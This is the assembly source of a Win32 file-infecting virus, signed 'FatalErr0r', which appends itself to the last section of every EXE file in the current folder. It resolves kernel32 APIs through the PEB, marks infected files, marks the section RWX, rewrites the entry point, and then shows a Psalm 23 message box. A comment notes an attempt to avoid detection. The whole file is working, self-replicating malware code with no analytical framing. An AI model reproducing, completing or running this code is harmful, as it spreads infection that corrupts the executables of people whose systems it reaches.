;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;
;;;  Win32 last section appender
;;;	 - code infects all EXE files in current folder
;;;  - after infection code shows MessageBox with psalm 23
;;;  writen by FatalErr0r
;;;  28/3/2011
;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.486
.model flat, stdcall
option casemap :none

include \masm32\include\windows.inc

.code
	start:
		_LSA_Start:				
				pushad								; save all registers 
				call _GetDeltaLongJmp
		_GetDelta:
				sub ebp, offset _GetDelta

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;;	http://blog.harmonysecurity.com/2009/06/retrieving-kernel32s-base-address.html
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
				cld
				assume fs:nothing
	  			mov edx, fs:[030h]
	  			mov edx, [edx + 0Ch]
	  			mov edx, [edx + 014h]
		next_mod:
	  			mov esi, [edx + 028h]
	  			push 24
	  			pop ecx
	  			xor edi, edi
		loop_modname:
	  			xor eax, eax
	  			lodsb
	  			cmp al, 'a'
	  			jl not_lowercase
	  			sub al, 020h
		not_lowercase:
	  			ror edi, 13
	  			add edi, eax
	  			loop loop_modname
	  			cmp edi, 06A4ABC5Bh
	  			mov ebx, [edx + 010h]
	  			mov edx, [edx]
	  			jne next_mod 						; ebx - kernel32
	  			
	  			
	  			mov edx, [ebx + 03Ch]
	  			add edx, ebx						; edx - PE header
	  			mov edx, [edx + 078h]
	  			add edx, ebx						; edx - Export_Table
	  			mov esi, [edx + 020h]
	  			add esi, ebx						; esi - API_names
	  			xor ecx, ecx
	  			
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;;	Find GetProcAddress API function adress
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	  	_FindGetProcAddress:
	  			inc ecx
	  			lodsd
	  			add eax, ebx
	  			cmp dword ptr [eax], "PteG"
	  			jnz _FindGetProcAddress
	  			cmp dword ptr [eax + 4], "Acor"
	  			jnz _FindGetProcAddress
	  			cmp dword ptr [eax + 8], "erdd"
	  			jnz _FindGetProcAddress
	  			
	  			mov esi, [edx + 024h]
	  			add esi, ebx						; esi - API_ordinals
	  			mov cx, word ptr [esi + ecx * 2]
	  			dec ecx
	  			
	  			mov esi, [edx + 01Ch]
	  			add esi, ebx
	  			mov edx, [esi + ecx * 4]
	  			add edx, ebx
	  			mov dword ptr [ebp + LSAGetProcAddress], edx
	  			
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;;	Find other API funtions adresses (11 functions)
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	  			
	  			lea esi, [ebp + _Krnl32_APIs]
	  			lea edi, [ebp + LSACloseHandle]
	  			mov ecx, 13
	  			
	  	_FindAllAPIs:		
	  			push esi
	  			push edi
	  			push ebx
	  			push ecx
	  			
	  			push esi
	  			push ebx
	  			call dword ptr [ebp + LSAGetProcAddress]
	  			
	  			pop ecx
	  			pop ebx
	  			pop edi
	  			pop esi
	  			
	  			stosd
	  			
	  	_FindEndOfString:
	  			lodsb
	  			cmp al, 0
	  			jnz _FindEndOfString
	  			loop _FindAllAPIs
	  			
	  			lea esi, dword ptr [ebp + dlllib]
	  			push esi
	  			call dword ptr [ebp + LSALoadLibraryA]
	  			
	  			cmp eax, 0
	  			jz _GetMessageBoxErr
	  			
	  			lea esi, dword ptr [ebp + LSAMessageBoxA + 4]
	  			push esi
	  			push eax
	  			call dword ptr [ebp + LSAGetProcAddress]
	  			
	  			cmp eax, 0
	  			jz _GetMessageBoxErr
	  			
	  			mov dword ptr [ebp + LSAMessageBoxA], eax
	  			
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;;	Find victims and infect them
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	  			

		;;; allocate memory for WIN32_FIND_DATAA structure
	  			push 013Ah						; sizeof(WIN32_FIND_DATAA)
	  			push GMEM_FIXED
	  			call dword ptr [ebp + LSAGlobalAlloc]
	  			
	  			cmp eax, 0
	  			jz _GlobalAllocErr
	  			mov dword ptr [ebp + FF_mem], eax
	  			
	  			lea eax, [ebp + exe_mask]		; exe_mask == *.exe
	  			
	  	;;; find first file with EXE extension		
	  			push dword ptr [ebp + FF_mem]
	  			push eax
	  			call dword ptr [ebp + LSAFindFirstFileA]
	  			
	  			cmp eax, INVALID_HANDLE_VALUE
	  			jz _FFErr
	  			mov dword ptr [ebp + FF_handle], eax
	  			
	  	_FindNextFile:
	  	;;; infect it
	  			push dword ptr [ebp + OEP]		; OEP - Old Entry Point
	  			lea esi, [ebp + _InfectFile]
	  			call esi
	  			
	  			pop dword ptr [ebp + OEP]
	  			
	  	;;; Find next files
	  			push dword ptr [ebp + FF_mem]
	  			push dword ptr [ebp + FF_handle]
	  			call dword ptr [ebp + LSAFindNextFileA]
	  			
	  			cmp eax, 0
	  			jnz _FindNextFile
	  			
	  			push 0
	  			lea esi, dword ptr [ebp + tit]
	  			push esi
	  			lea esi, dword ptr [ebp + mess]
	  			push esi
	  			push 0
	  			call dword ptr [ebp + LSAMessageBoxA]
	  			
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;;	Release and close
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		  			
	  			push dword ptr [ebp + FF_handle]
	  			call dword ptr [ebp + LSAFindClose]
	  			
	  	_FFErr:
	  			push dword ptr [ebp + FF_mem]
	  			call dword ptr [ebp + LSAGlobalFree]
	  			
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;;	Give the control to the original code
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
		_GetMessageBoxErr:
	  	_GlobalAllocErr:
	  			;popad
	  			jmp dword ptr [ebp + OEP]
	  			ret
	  			
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;; InfectFile Function
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	  			
	  	_InfectFile:
	  			lea esi, [ebp + _LSA_Start]
				lea eax, [ebp + _LSA_End]
				sub eax, esi
				mov dword ptr [ebp + VirusSize], eax	; virus size calculating
				
	  			mov edx, dword ptr [ebp + FF_mem]
	  			add edx, 02Ch							; edx - WIN32_FIND_DATAA.cFileName
	  			
	  	;; Open file if exists
				push 0
				push FILE_ATTRIBUTE_NORMAL
				push OPEN_EXISTING
				push 0
				push FILE_SHARE_READ or FILE_SHARE_WRITE
				push GENERIC_READ or GENERIC_WRITE
				push edx
				call dword ptr [ebp + LSACreateFileA]
				
				cmp eax, INVALID_HANDLE_VALUE
				jz _CFErr
				
				mov dword ptr [ebp + OF_handle], eax
				
		;; Get size of open file
				push 0
				push eax
				call dword ptr [ebp + LSAGetFileSize]
				
				mov dword ptr [ebp + FileSize], eax
				
		;; Create file mapping
				push 0
				push 01000h
				push 0
				push PAGE_READWRITE
				push 0
				push dword ptr [ebp + OF_handle]
				call dword ptr [ebp + LSACreateFileMappingA]
				
				cmp eax, 0
				jz _CFErr2
				
				mov dword ptr [ebp + MF_handle], eax
				
		;; Map a view of a file into the memory
				push 01000h
				push 0
				push 0
				push FILE_MAP_ALL_ACCESS
				push eax
				call dword ptr [ebp + LSAMapViewOfFile]
				
				cmp eax, 0
				jz _CFErr3
				
				mov dword ptr [ebp + MF_mapped], eax
				
		;; Is file infected?
				cmp dword ptr [eax + 01Fh], "!asl"			; Infect Mark
				jz _CFInfected
				
		;; Create infect mark for non-infected file
				mov dword ptr [eax + 01Fh], "!asl"
				
				mov edx, [eax + 03Ch]
				add edx, eax								; Image Optional Header
				
				mov ecx, [edx + 03Ch]						; FILE ALIGNMENT
				mov dword ptr [ebp + FileAlign], ecx
				
		;; Get address of last section
				mov eax, edx
				lea esi, dword ptr [ebp + _GetLastSection]
				call esi
				
				mov edx, dword ptr [eax + 010h]
				sub edx, dword ptr [eax + 08h]
				
		;; Is here enough space for virus code?
				cmp edx, dword ptr [ebp + VirusSize]
				jge _ItsOk
		;; If no then enlarge virus size by FileAlignment size 
				mov edx, dword ptr [ebp + FileAlign]
				add dword ptr [ebp + VirusSize], edx
				
			_ItsOk:
		;; Unmap && close the mapping
				push dword ptr [ebp + MF_mapped]
				call dword ptr [ebp + LSAUnmapViewOfFile]
				
				push dword ptr [ebp + MF_handle]
				call dword ptr [ebp + LSACloseHandle]
				
		;; Align virus size and FileAlignment
				mov eax, [ebp + VirusSize]
				mov ecx, [ebp + FileAlign]
				lea esi, [ebp + _Alignment]
				call esi
				
				add dword ptr [ebp + FileSize], eax
				
		;; Again create file mapping
				push 0
				push dword ptr [ebp + FileSize]
				push 0
				push PAGE_READWRITE
				push 0
				push dword ptr [ebp + OF_handle]
				call dword ptr [ebp + LSACreateFileMappingA]
				
				cmp eax, 0
				jz _CFErr2
				
				mov dword ptr [ebp + MF_handle], eax
				
		;; 
				push dword ptr [ebp + FileSize]
				push 0
				push 0
				push FILE_MAP_ALL_ACCESS
				push eax
				call dword ptr [ebp + LSAMapViewOfFile]
				
				cmp eax, 0
				jz _CFErr3
				
				mov dword ptr [ebp + MF_mapped], eax
				
		;; Insert the new section into the mapped file
				lea esi, [ebp + _NewSection]
				call esi
				
		_CFInfected:
				push dword ptr [ebp + MF_mapped]
				call dword ptr [ebp + LSAUnmapViewOfFile]
				
		_CFErr3:
				push dword ptr [ebp + MF_handle]
				call dword ptr [ebp + LSACloseHandle]
				
		_CFErr2:
				push dword ptr [ebp + OF_handle]
				call dword ptr [ebp + LSACloseHandle]
		
		_CFErr:
				ret

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;;	List of API function names
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
					
		_Krnl32_APIs:
	  			db		"CloseHandle",0
	  			db		"CreateFileA",0
	  			db		"CreateFileMappingA",0
	  			db		"FindClose",0
	  			db		"FindFirstFileA",0
	  			db		"FindNextFileA",0
	  			db		"GetFileSize",0
	  			db		"GlobalAlloc",0
	  			db		"GlobalFree",0
	  			db		"LoadLibraryA",0
	  			db		"MapViewOfFile",0
	  			db		"UnmapViewOfFile",0
	  			
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;;	Create a new section
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
		_NewSection:
				mov ebx, eax
				mov eax, [eax + 03Ch]						; PE offset
				add eax, ebx
				mov esi, eax
				
				mov edx, [eax + 03Ch]						; FileAlign
				mov dword ptr [ebp + FileAlign], edx
				
				mov edx, [eax + 038h]						; SectionAlignment
				mov dword ptr [ebp + SecAlign], edx
				
				mov edx, [eax + 028h]						; AddressOfEntryPoint
				add edx, [eax + 034h]						; ImageBase
				mov dword ptr [ebp + OEP], edx
				
				lea esi, dword ptr [ebp + _GetLastSection]
				call esi
				
				mov ecx, [eax + 08h]						; VirtualSize
				
				mov edi, [eax + 014h]						; PointerToRawData
				add edi, ecx								; edi = End of Old Section
				mov dword ptr [ebp + RVASec], edi
				
				mov edi, [eax + 0Ch]						; VirtualAddress
				add edi, ecx
				mov dword ptr [esi + 028h], edi				; AddressOfEntryPoint
				
				mov edx, [eax + 010h]						; SizeOfRawData
				
				or dword ptr [eax + 024h], 0E0000000h		; Characteristics RWX
				mov edx, [ebp + VirusSize]
				add dword ptr [eax + 08h], edx				; VirtualSize += VirusSize
				
				push eax
				push ecx
				push esi
				mov eax, edx								; VirusSize
				mov ecx, [ebp + FileAlign]
				lea esi, [ebp + _Alignment]
				call esi
				mov edi, eax
				pop esi
				pop ecx
				pop eax
				
				mov edx, dword ptr [eax + 010h]				; SizeOfRawData
				sub dword ptr [esi + 01Ch], edx				; SizeOfCode
				
				add dword ptr [eax + 010h], edi				; SizeOfRawData
				add dword ptr [esi + 01Ch], edi				; SizeOfCode
				
				push ecx
				push eax
				push esi
				mov eax, ecx
				mov ecx, dword ptr [ebp + SecAlign]
				lea esi,dword ptr [ebp + _Alignment]
				call esi
				pop esi
				sub dword ptr [esi + 050h], eax
				pop eax
				
				push eax
				push esi
				mov eax, [eax + 08h]						; VirtualSize
				mov ecx, [ebp + SecAlign]
				lea esi, [ebp + _Alignment]
				call esi
				pop esi
				add dword ptr [esi + 050h], eax
				pop ecx
				pop eax
				
				mov edi, [ebp + MF_mapped]
				mov ecx, [ebp + VirusSize]
				add edi, [ebp + RVASec]
				lea esi, [ebp + _LSA_Start]
				lea edx, [ebp + _LSA_End]

			_CopyCode:
				cmp esi, edx
				jg _JmpOldEIP
				
				mov al, byte ptr [esi]
				mov byte ptr [edi], al
				inc esi
				inc edi
				loop _CopyCode
				
					
			_JmpOldEIP:
				ret

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;;	Alignment function
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
		_Alignment:
				push edx
				xor edx, edx
				add eax, ecx									; Data += Alignment
				dec eax											; Data--
				div ecx											; Data /= Alignment
				mul ecx											; Data *= Alignment
				pop edx
				ret
				
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;;	Get the last section
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
		_GetLastSection:
				mov esi, eax
				movzx ecx, word ptr [eax + 06h]				; NumberOfSections
				dec ecx
				mov eax, 028h								; sizeof IMAGE_SECTION_HEADER
				imul cl
				add eax, 0F8h								; sizeof IMAGE_NT_HEADERS
				add eax, esi
				ret
				
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;;	Second part of DeltaOffset code
	;;; (Attempt to avoid detection of short jmp)
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
		_GetDeltaLongJmp:
			pop ebp
			jmp offset _GetDelta
			
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;;	Space for variables (values, adresses ...)
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	  	
	  	LSACloseHandle			dd		0
	  	LSACreateFileA			dd		0
	  	LSACreateFileMappingA	dd		0
	  	LSAFindClose			dd		0
	  	LSAFindFirstFileA		dd		0
	  	LSAFindNextFileA		dd		0
	  	LSAGetFileSize			dd		0
	  	LSAGlobalAlloc			dd		0
	  	LSAGlobalFree			dd		0
	  	LSALoadLibraryA			dd		0
	  	LSAMapViewOfFile		dd		0
	  	LSAUnmapViewOfFile		dd		0
	  							dd		0
	  	OEP						dd		_FakeEP
	  	exe_mask				db		"*.exe",0
	  	dlllib					db		"user32.dll",0
		tit						db		"LSA by FatalErr0r",0
	  	mess					db 		"Even though I walk through the valley of the shadow of death, I will fear no evil,for you are with me; your rod and your staff, they comfort me.",0
	  	FF_mem					dd		0
	  	FF_handle				dd		0
	  	OF_handle				dd		0
	  	FileSize				dd		0
	  	MF_handle				dd		0
	  	MF_mapped				dd		0
	  	FileAlign				dd		0
	  	SecAlign				dd		0
	  	RVASec					dd		0
	  	VirusSize				dd		0
	  	SizeOfRawData			dd		0
	  	
	  	LSAGetProcAddress		dd		0
	  	LSAMessageBoxA			dd		0
	  							db		"MessageBoxA",0
	  	ret
	  	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;;
	;;;	End of code && Fake Entry Point for zero-generation
	;;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	  	_LSA_End:
	  	_FakeEP:
	  			popad
	  			ret
	end start